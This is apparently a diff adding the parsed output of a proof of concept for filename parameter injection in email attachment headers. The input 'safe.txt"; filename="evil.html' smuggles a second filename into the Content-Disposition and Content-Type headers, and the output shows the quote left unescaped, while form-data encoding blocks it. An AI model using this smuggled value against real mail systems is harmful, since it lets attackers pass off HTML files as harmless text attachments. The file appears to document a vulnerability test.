@@ -1,0 +1,17 @@
+=== parsed PoC output ===
+PAYLOAD::safe.txt"; filename="evil.html
+CDISP::Content-Disposition: attachment; name="safe.txt"; filename="evil.html"; filename="safe.txt"; filename="evil.html"
+CTYPE::Content-Type: text/plain; name="safe.txt"; filename="evil.html"
+FORM_DATA_HEADER::Content-Disposition: form-data; filename="safe.txt%22; filename=%22evil.html"
+FILENAME_COUNT::3
+INJECTED_PARAM_PRESENT::1
+CDISP_HAS_BACKSLASH_QUOTE::0
+FORMDATA_INJECTED::0
+FORMDATA_PCT22::1
+RAW_B64::Q29udGVudC1UeXBlOiB0ZXh0L3BsYWluOyBuYW1lPSJzYWZlLnR4dCI7IGZpbGVuYW1lPSJldmlsLmh0bWwiDQpDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiYXNlNjQNCkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IG5hbWU9InNhZmUudHh0IjsgZmlsZW5hbWU9ImV2aWwuaHRtbCI7DQogZmlsZW5hbWU9InNhZmUudHh0IjsgZmlsZW5hbWU9ImV2aWwuaHRtbCINCg==
+
+=== full rendered attachment headers (CR shown as \r) ===
+Content-Type: text/plain; name="safe.txt"; filename="evil.html"\r
+Content-Transfer-Encoding: base64\r
+Content-Disposition: attachment; name="safe.txt"; filename="evil.html";\r
+ filename="safe.txt"; filename="evil.html"\r
